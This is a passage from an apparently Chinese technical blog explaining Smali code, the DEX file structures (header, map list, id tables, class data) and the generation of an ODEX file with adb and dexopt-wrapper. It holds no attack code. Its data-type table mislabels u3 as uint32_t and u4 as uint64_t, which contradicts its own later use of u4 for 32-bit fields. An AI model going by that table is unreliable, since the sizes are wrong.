class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">.class public LHello;</span><br><span class="line">.super Ljava/lang/Object;</span><br><span class="line">.source &quot;Hello.java&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># direct methods</span><br><span class="line">.method public constructor &lt;init&gt;()V</span><br><span class="line">    .registers 1</span><br><span class="line"></span><br><span class="line">    .prologue</span><br><span class="line">    .line 1</span><br><span class="line">    invoke-direct &#123;p0&#125;, Ljava/lang/Object;-&gt;&lt;init&gt;()V</span><br><span class="line"></span><br><span class="line">    return-void</span><br><span class="line">.end method</span><br><span class="line"></span><br><span class="line">.method public static main([Ljava/lang/String;)V</span><br><span class="line">    .registers 5</span><br><span class="line"></span><br><span class="line">    .prologue</span><br><span class="line">    .line 9</span><br><span class="line">    new-instance v0, LHello;</span><br><span class="line"></span><br><span class="line">    invoke-direct &#123;v0&#125;, LHello;-&gt;&lt;init&gt;()V</span><br><span class="line"></span><br><span class="line">    .line 10</span><br><span class="line">    sget-object v1, Ljava/lang/System;-&gt;out:Ljava/io/PrintStream;</span><br><span class="line"></span><br><span class="line">    const/4 v2, 0x5</span><br><span class="line"></span><br><span class="line">    const/4 v3, 0x3</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v0, v2, v3&#125;, LHello;-&gt;foo(II)I</span><br><span class="line"></span><br><span class="line">    move-result v0</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v1, v0&#125;, Ljava/io/PrintStream;-&gt;println(I)V</span><br><span class="line"></span><br><span class="line">    .line 11</span><br><span class="line">    return-void</span><br><span class="line">.end method</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># virtual methods</span><br><span class="line">.method public foo(II)I</span><br><span class="line">    .registers 5</span><br><span class="line"></span><br><span class="line">    .prologue</span><br><span class="line">    .line 5</span><br><span class="line">    add-int v0, p1, p2</span><br><span class="line"></span><br><span class="line">    sub-int v1, p1, p2</span><br><span class="line"></span><br><span class="line">    mul-int/2addr v0, v1</span><br><span class="line"></span><br><span class="line">    return v0</span><br><span class="line">.end method</span><br></pre></td></tr></table></figure><p>有关Smali与Dalvik的语法知识可以看我之前写的一篇笔记<a href="https://v5le0n9.github.io/posts/15be101a.html#1-%E5%88%9D%E8%AF%86APK%E3%80%81Dalvik%E5%AD%97%E8%8A%82%E7%A0%81%E4%BB%A5%E5%8F%8ASmali">初识APK、Dalvik字节码以及Smali</a>，虽然不全但应该够用。</p><h1 id="4-Android可执行文件"><a href="#4-Android可执行文件" class="headerlink" title="4. Android可执行文件"></a>4. Android可执行文件</h1><p>DEX文件是由Java代码编译得到的Dalvik虚拟机能直接执行的文件。分析Android程序大多数时候是在和DEX文件打交道。</p><h2 id="4-1-Android程序的生成步骤"><a href="#4-1-Android程序的生成步骤" class="headerlink" title="4.1 Android程序的生成步骤"></a>4.1 Android程序的生成步骤</h2><ol><li>打包资源文件，生成<code>R.java</code>文件；</li><li>处理aidl文件，生成相应的Java文件；</li><li>编译工程源码，生成相应的class文件；</li><li>转换所有的class文件，生成<code>classes.dex</code>文件；</li><li>打包生成APK文件；</li><li>对APK文件进行签名；</li><li>对签名后的APK文件进行对齐处理。</li></ol><h2 id="4-2-DEX文件格式"><a href="#4-2-DEX文件格式" class="headerlink" title="4.2 DEX文件格式"></a>4.2 DEX文件格式</h2><p>DEX文件使用到的数据类型：</p><div class="table-container"><table><thead><tr><th>类型</th><th>含义</th></tr></thead><tbody><tr><td>u1</td><td>等同于uint8_t，1字节的无符号数</td></tr><tr><td>u2</td><td>等同于uint16_t，2字节的无符号数</td></tr><tr><td>u3</td><td>等同于uint32_t，4字节的无符号数</td></tr><tr><td>u4</td><td>等同于uint64_t，8字节的无符号数</td></tr><tr><td>sleb128</td><td>有符号LEB128，可变长度1~5字节</td></tr><tr><td>uleb128</td><td>无符号LEB128，可变长度1~5字节</td></tr><tr><td>uleb128p1</td><td>无符号LEB128值加1，可变长度1~5字节</td></tr></tbody></table></div><p>sleb128、uleb128、uleb128p1是DEX文件中特有的LEB128数据类型。其中每个LEB128由1~5个字节组成，所有的字节组合在一起表示一个32位的数据。</p><img src="/posts/d368aa06/4.2.1.png" class="" title="LEB128数据类型"><p>每个字节只有7位有效位，如果第1个字节的最高位为1，标识LEB128需要用到第2个字节，如果第2个字节的最高位为1，表示会用到第3个字节，以此类推，直到最后的字节最高位为0。LEB128最多只会使用到5个字节，如果第5个字节的最高位仍为1，表示该DEX文件无效，Dalvik虚拟机在验证DEX文件时会失败返回。</p><p>DEX文件是由多个结构体组合而成。一个DEX文件由9部分组成，分别为dex header、string_ids、type_ids、proto_ids、field_ids、method_ids、class_def、data、link_data。</p><img src="/posts/d368aa06/4.2.4.png" class="" title="DEX文件结构"><h3 id="4-2-1-dex-header"><a href="#4-2-1-dex-header" class="headerlink" title="4.2.1 dex header"></a>4.2.1 dex header</h3><p>dex header指定了DEX文件的一些属性，并记录了其它8部分数据结构在DEX文件中的物理偏移与大小。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexHeader</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u1      magic[<span class="number">8</span>];<span class="comment">//魔数，标识DEX文件</span></span><br><span class="line">    u4      checksum; <span class="comment">//adler32校验</span></span><br><span class="line">    u1      signature[kSHA1DigestLen];<span class="comment">//SHA-1哈希值 </span></span><br><span class="line">    u4      file_size; <span class="comment">//DEX文件大小</span></span><br><span class="line">    u4      header_size; <span class="comment">//DexHeader大小</span></span><br><span class="line">    u4      endian_tag; <span class="comment">//字节序标记</span></span><br><span class="line">    u4      link_size; <span class="comment">//链接段大小</span></span><br><span class="line">    u4      link_off; <span class="comment">//链接段偏移</span></span><br><span class="line">    u4      map_off;<span class="comment">//DexMapList的文件偏移</span></span><br><span class="line">    u4      string_ids_size; <span class="comment">//DexStringId的个数</span></span><br><span class="line">    u4      string_ids_off; <span class="comment">//DexStringId的文件偏移</span></span><br><span class="line">    u4      type_ids_size; <span class="comment">//DexTypeId的个数</span></span><br><span class="line">    u4      type_ids_off; <span class="comment">//DexTypeId的文件偏移</span></span><br><span class="line">    u4      proto_ids_size; <span class="comment">//DexProtoId的个数</span></span><br><span class="line">    u4      proto_ids_off; <span class="comment">//DexProtoId的文件偏移</span></span><br><span class="line">    u4      field_ids_size;<span class="comment">//DexFieldId的个数</span></span><br><span class="line">    u4      field_ids_off;<span class="comment">//DexFieldId的文件偏移</span></span><br><span class="line">    u4      method_ids_size; <span class="comment">//DexMethodId的个数</span></span><br><span class="line">    u4      method_ids_off; <span class="comment">//DexMethodId的文件偏移</span></span><br><span class="line">    u4      class_defs_size; <span class="comment">//DexClassDef的个数</span></span><br><span class="line">    u4      class_defs_off; <span class="comment">//DexClassDef的文件偏移</span></span><br><span class="line">    u4      data_size;<span class="comment">//数据段的大小</span></span><br><span class="line">    u4      data_off; <span class="comment">//数据段的文件偏移</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>magic：表示了一个有效的DEX文件，目前它的值固定为64 65 78 0a 30 33 35 00。</li><li>checksum：DEX文件的校验和，通过它来判断DEX文件是否被损坏或篡改。</li><li>signature：识别最佳化之前的DEX文件。</li><li>header_size：记录了DexHeader结构本身占用的字节数，为0x70。</li><li>endian_tag：指定了dex运行环境的cpu字节序，预设值ENDIAN_CONSTANT等于0x12345678，默认采用Little-Endian字节序。</li><li>link_size和link_off：指定链接段的大小与文件偏移，大多数情况下它们的值都为0。</li><li>map_off：指定了DexMapList结构的文件偏移。</li></ul><img src="/posts/d368aa06/4.2.2.png" class="" title="DEX文件格式"><h3 id="4-2-2-DexMapList"><a href="#4-2-2-DexMapList" class="headerlink" title="4.2.2 DexMapList"></a>4.2.2 DexMapList</h3><p>Dalvik虚拟机解析DEX文件的内容，最终将其映射成DexMapList数据结构。DexHeader结构的map_off字段指明了DexMapList结构在DEX文件中的偏移。</p><p>DexMapList数据结构声明如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexMapList</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u4    size;<span class="comment">//DexMapItem的个数</span></span><br><span class="line">    DexMapItem    <span class="built_in">list</span>[<span class="number">1</span>];<span class="comment">//DexMapItem结构</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>size字段表示接下来有多少个DexMapItem结构，它的声明如下：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexMapItem</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u2    type;<span class="comment">//kDexType开头的类型</span></span><br><span class="line">    u2    unused;<span class="comment">//未使用，用于字节对齐</span></span><br><span class="line">    u4    size;<span class="comment">//指定类型的个数</span></span><br><span class="line">    u4    offset;<span class="comment">//指定类型数据的文件偏移</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>type字段为一个枚举常量，通过类型名称很容易判断它的具体类型。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    kDexTypeHeaderItem= <span class="number">0x0000</span>,</span><br><span class="line">    kDexTypeStringIdItem= <span class="number">0x0001</span>,</span><br><span class="line">    kDexTypeTypeIdItem= <span class="number">0x0002</span>,</span><br><span class="line">    kDexTypeProtoIdItem= <span class="number">0x0003</span>,</span><br><span class="line">    kDexTypeFieldIdItem= <span class="number">0x0004</span>,</span><br><span class="line">    kDexTypeMethodIdItem= <span class="number">0x0005</span>,</span><br><span class="line">    kDexTypeClassDefItem= <span class="number">0x0006</span>,</span><br><span class="line">    kDexTypeMapList= <span class="number">0x1000</span>,</span><br><span class="line">    kDexTypeTypeList= <span class="number">0x1001</span>,</span><br><span class="line">    kDexTypeAnnotationSetRefItem= <span class="number">0x1002</span>,</span><br><span class="line">    kDexTypeAnnotationSetItem= <span class="number">0x1003</span>,</span><br><span class="line">    kDexTypeClassDataItem= <span class="number">0x2000</span>,</span><br><span class="line">    kDexTypeCodeItem= <span class="number">0x2001</span>,</span><br><span class="line">    kDexTypeStringDataItem= <span class="number">0x2002</span>,</span><br><span class="line">    kDexTypeDebugInfoItem= <span class="number">0x2003</span>,</span><br><span class="line">    kDexTypeAnnotationItem= <span class="number">0x2004</span>,</span><br><span class="line">    kDexTypeEncodeArrayItem= <span class="number">0x2005</span>,</span><br><span class="line">    kDexTypeAnnotationsDirectoryItem= <span class="number">0x2006</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>size字段制定了特定类型的个数，它们以特定的类型在DEX文件中连续存放。</li><li>offset字段为该类型的文件起始偏移地址。</li></ul><p>以<code>Hello.dex</code>为例，在dex header中找到DexMapList数据结构的物理偏移地址为0x290。</p><img src="/posts/d368aa06/4.2.3.png" class="" title="DEX文件格式"><p>读取0x290处的一个双字值为0x0d，表明紧跟着13个DexMapItem结构。使用010 Editor的DEX模板分析DEX文件一目了然。</p><h3 id="4-2-3-string-ids"><a href="#4-2-3-string-ids" class="headerlink" title="4.2.3 string_ids"></a>4.2.3 string_ids</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexStringId</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u4    stringDataOff;<span class="comment">//字符串数据偏移</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>DexStringId结构只有一个stringDataOff字段，直接指向字符串数据。</p><img src="/posts/d368aa06/4.2.5.png" class="" title="DexStringId"><p>这里的字符串数据并非普通的ASCII字符串，它是由MUTF-8编码来表示的，不同于UTF-8。MUTF-8字符串的头部存放的是由uleb128编码的字符的个数，后面才是真正的字符串，最后以空字符0表示字符串结尾。</p><h3 id="4-2-4-type-ids"><a href="#4-2-4-type-ids" class="headerlink" title="4.2.4 type_ids"></a>4.2.4 type_ids</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexTypeId</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u4    descriptorIdx;<span class="comment">//指向DexStringId列表的索引</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>descriptorIdx为指向DexStringId列表的索引，它对应的字符串代表了具体类的类型。</p><img src="/posts/d368aa06/4.2.6.png" class="" title="DexTypeId"><h3 id="4-2-5-proto-ids"><a href="#4-2-5-proto-ids" class="headerlink" title="4.2.5 proto_ids"></a>4.2.5 proto_ids</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexProtoId</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u4    shortyIdx;<span class="comment">//指向DexStringId列表的索引</span></span><br><span class="line">    u4    returnTypeIdx;<span class="comment">//指向DexTypeId列表的索引</span></span><br><span class="line">    u4    parametersOff;<span class="comment">//指向DexTypeList的偏移</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>DexProtoId是一个方法声明结构体，shortyIdx为方法声明字符串，returnTypeIdx为方法返回类型字符串，parametersOff指向一个DexTypeList结构体，存放了方法的参数列表，DexTypeList声明如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexTypeList</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u4    size;<span class="comment">//DexTypeItem的个数</span></span><br><span class="line">    DexTypeItem     <span class="built_in">list</span>[<span class="number">1</span>];<span class="comment">//DexTypeItem结构</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>DexTypeItem声明如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexTypeItem</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u2    typeIdx;<span class="comment">//指向DexTypeId列表的索引</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>DexTypeItem中的typeIdx最终也是指向一个字符串。</p><img src="/posts/d368aa06/4.2.7.png" class="" title="DexProtoId"><h3 id="4-2-6-field-ids"><a href="#4-2-6-field-ids" class="headerlink" title="4.2.6 field_ids"></a>4.2.6 field_ids</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexFieldId</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u2    classIdx;<span class="comment">//类的类型，指向DexTypeId列表的索引</span></span><br><span class="line">    u2    typeIdx;<span class="comment">//字段类型，指向DexTypeId列表的索引</span></span><br><span class="line">    u4    nameIdx;<span class="comment">//字段名，指向DexStringId列表的索引</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>DexFieldId结构中的数据全部是索引值，指明了字段所在的类、字段的类型以及字段名。</p><h3 id="4-2-7-method-ids"><a href="#4-2-7-method-ids" class="headerlink" title="4.2.7 method_ids"></a>4.2.7 method_ids</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexMethodId</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u2    classIdx;<span class="comment">//类的类型，指向DexTypeId列表的索引</span></span><br><span class="line">    u2    protoIdx;<span class="comment">//声明类型，指向DexProtoId列表的索引</span></span><br><span class="line">    u4    nameIdx;<span class="comment">//方法名，指向DexStringId列表的索引</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>DexMethodId结构的数据也都是索引，指明了方法所在的类、方法的声明以及方法名。</p><h3 id="4-2-8-class-def"><a href="#4-2-8-class-def" class="headerlink" title="4.2.8 class_def"></a>4.2.8 class_def</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexClassDef</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u4    classIdx;<span class="comment">//类的类型，执行DexTypeId列表的索引</span></span><br><span class="line">    u4    accessFlags;<span class="comment">//访问标志</span></span><br><span class="line">    u4    superclassIdx;<span class="comment">//父类类型，指向DexTypeId列表的索引</span></span><br><span class="line">    u4    interfacesOff;<span class="comment">//接口，指向DexTypeList的偏移</span></span><br><span class="line">    u4    sourceFileIdx;<span class="comment">//源文件名，指向DexStringId列表的索引</span></span><br><span class="line">    u4    annotationsOff;<span class="comment">//注解，指向DexAnnotationsDirectoryItem结构</span></span><br><span class="line">    u4    classDataOff;<span class="comment">//指向DexClassData结构的偏移</span></span><br><span class="line">    u4    staticValuesOff;<span class="comment">//指向DexEncodedArray结构的偏移，记录类中的静态数据  </span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="4-2-9-data"><a href="#4-2-9-data" class="headerlink" title="4.2.9 data"></a>4.2.9 data</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexClassData</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DexClassDataHeader    header;<span class="comment">//指定字段与方法的个数</span></span><br><span class="line">    DexField *    staticFields;<span class="comment">//静态字段，DexField结构</span></span><br><span class="line">    DexField *    instanceFields;<span class="comment">//实例字段，DexField结构</span></span><br><span class="line">    DexMethod *    directMethods;<span class="comment">//直接方法，DexMethod结构</span></span><br><span class="line">    DexMethod *    virtualMethods;<span class="comment">//虚方法，DexMethod结构</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>DexClassDataHeader结构记录了当前类中字段与方法的数目，它的声明如下：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexClassDataHeader</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u4    staticFieldsSize;<span class="comment">//静态字段个数</span></span><br><span class="line">    u4    instanceFieldsSize;<span class="comment">//实例字段个数</span></span><br><span class="line">    u4    directMethodsSize;<span class="comment">//直接方法个数</span></span><br><span class="line">    u4    virtualMethodsSize;<span class="comment">//虚方法个数</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>DexField结构描述了字段的类型与访问标志，它的结构声明如下：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexFiled</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u4    fieldIdx;<span class="comment">//指向DexFieldId的索引</span></span><br><span class="line">    u4    accessFlags;<span class="comment">//访问标志</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>accessFlags字段与DexClassDef中的相应字段的类型相同。</p><ul><li>DexMethod结构描述方法的原型、名称、访问标志以及代码数据块，它的声明如下：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexMethod</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u4    methodIdx;<span class="comment">//指向DexMethodId的索引</span></span><br><span class="line">    u4    accessFlags;<span class="comment">//访问标志</span></span><br><span class="line">    u4    codeOff;<span class="comment">//指向DexCode结构的偏移</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>DexCode描述了方法更详细的信息以及方法中指令的内容，它的声明如下：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexCode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u2    registersSize;<span class="comment">//使用的寄存器个数</span></span><br><span class="line">    u2    insSize;<span class="comment">//参数个数</span></span><br><span class="line">    u2    outsSize;<span class="comment">//调用其他方法时使用的寄存器个数</span></span><br><span class="line">    u2    triesSize;<span class="comment">//Try/Catch个数</span></span><br><span class="line">    u4    debugInfoOff;<span class="comment">//指向调试信息的偏移</span></span><br><span class="line">    u4    insnsSize;<span class="comment">//指令集个数，以2字节为单位</span></span><br><span class="line">    u2    insns[<span class="number">1</span>];<span class="comment">//指令集</span></span><br><span class="line">    <span class="comment">//2字节空间用于结构对齐</span></span><br><span class="line">    <span class="comment">//try_item[triesSize]    DexTry结构</span></span><br><span class="line">    <span class="comment">//Try/Catch中handler的个数</span></span><br><span class="line">    <span class="comment">//catc_handler_item[handlersSize]    DexCatchHandler结构</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="4-3-ODEX文件格式"><a href="#4-3-ODEX文件格式" class="headerlink" title="4.3 ODEX文件格式"></a>4.3 ODEX文件格式</h2><p>ODEX是OptimizedDEX的缩写，表示经过优化的DEX文件。ODEX文件仅存在于Android 4.4以前，ART模式下DEX则被优化为OAT文件。</p><p>ODEX有两种存在方式：一种是从APK程序中提取出来，与APK文件存放在同一目录且文件后缀为<code>.odex</code>的文件，这类ODEX文件多是Android ROM的系统程序；另一种是dalvik-cache缓存文件，这类ODEX文件仍然以<code>.dex</code>为后缀，存放在<code>cache/dalvik-cache</code>目录，保存的形式为“apk路径@apk名@classes.dex”，例如“system@app@Calculator.apk@classes.dex”表示安装在<code>system/app</code>目录下<code>Calculator.apk</code>程序的ODEX文件。</p><p>由于Android程序的APK文件为ZIP压缩包格式，Dalvik虚拟机每次加载它们时需要从APK中读取<code>classes.dex</code>文件，这会耗费很多CPU时间。而采用ODEX方式优化的DEX文件，已经包含了加载DEX必须的依赖库文件列表，Dalvik虚拟机只需检测并加载所需的依赖库即可执行相应的DEX文件，这大大缩短了读取DEX文件所需的时间，而对于部分Android系统的ROM，由于将系统App全部转换成外置的ODEX文件与APK文件放在同一目录，这样系统在启动加载这些程序时会节省更多的时间，启动速度自然也会更快。</p><h3 id="4-3-1-生成ODEX文件"><a href="#4-3-1-生成ODEX文件" class="headerlink" title="4.3.1 生成ODEX文件"></a>4.3.1 生成ODEX文件</h3><p>下载<a href="https://pan.baidu.com/s/1D4D2-1IM-rWiOtj8c8tMKA">dexopt-wrapper</a>(提取码：w9nc)工具，将dexopt-wrapper程序push到Android设备(Android 4.4可行，Android 9出错)上并赋予执行权限，执行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb push dexopt-wrapper /data/local</span><br><span class="line">adb shell chmod 777 /data/local/dexopt-wrapper</span><br></pre></td></tr></table></figure><p>将<code>Hello.dex</code>文件改名为<code>classes.dex</code>并打包成ZIP文件，将ZIP文件push到与dexopt-wrapper工具同目录下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb push classes.zip /data/local</span><br></pre></td></tr></table></figure><p>调用dexopt-wrapper来生成ODEX文件，进入<code>/data/local</code>运行dexopt-wrapper工具：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@vbox86p:/data/local # ./dexopt-wrapper classes.zip Hello.odex</span><br><span class="line">--- BEGIN &#x27;classes.zip&#x27; (bootstrap=0) ---</span><br><span class="line">--- waiting for verify+opt, pid=2191</span><br><span class="line">--- would reduce privs here</span><br><span class="line">--- END &#x27;classes.zip&#x27; (success) ---</span><br><span class="line">root@vbox86p:/data/local #</span><br></pre></td></tr></table></figure><p>将ODEX文件pull出来以备后续分析：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb pull /data/local/Hello.odex</span><br></pre></td></tr></table></figure><h3 id="4-3-2-ODEX文件结构"><a href="#4-3-2-ODEX文件结构" class="headerlink" title="4.3.2 ODEX文件结构"></a>4.3.2 ODEX文件结构</h3><p>ODEX文件的结构可以理解为DEX文件的一个父集(超集)，ODEX文件在DEX文件头部添加了一些数据，在DEX文件尾部添加了DEX文件的依赖库以及一些辅助数据。</p><div class="table-container"><table><thead><tr><th style="text-align:center">odex文件头</th></tr></thead><tbody><tr><td style="text-align:center">dex文件</td></tr><tr><td style="text-align:center">依赖库</td></tr><tr><td style="text-align:center">辅助数据</td></tr></tbody></table></div><h4 id="4-3-2-1-odex文件头"><a href="#4-3-2-1-odex文件头" class="headerlink" title="4.3.2.1 odex文件头"></a>4.3.2.1 odex文件头</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexOptHeader</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u1    magic[<span class="number">8</span>];<span class="comment">//魔数，用于标识ODEX文件</span></span><br><span class="line">    u4    dexOffset;<span class="comment">//dex文件头偏移</span></span><br><span class="line">    u4    dexLength;<span class="comment">//dex文件总长度</span></span><br><span class="line">    u4    depsOffset;<span class="comment">//odex依赖库列表偏移</span></span><br><span class="line">    u4    depsLength;<span class="comment">//依赖库列表总长度</span></span><br><span class="line">    u4    optOffset;<span class="comment">//辅助数据偏移</span></span><br><span class="line">    u4    optLength;<span class="comment">//辅助数据总长度</span></span><br><span class="line">    